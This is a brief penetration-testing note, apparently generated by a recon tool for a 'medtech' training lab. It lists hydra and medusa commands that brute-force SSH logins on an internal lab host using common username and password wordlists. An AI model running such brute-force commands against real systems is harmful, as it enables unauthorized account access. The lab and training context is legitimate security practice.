```bash
[*] ssh on tcp/22

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/home/kali/Notes/Labs/medtech/internal_ips/172.16.185.14/scans/tcp22/tcp_22_ssh_hydra.txt" ssh://172.16.185.14

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 22 -O "/home/kali/Notes/Labs/medtech/internal_ips/172.16.185.14/scans/tcp22/tcp_22_ssh_medusa.txt" -M ssh -h 172.16.185.14


```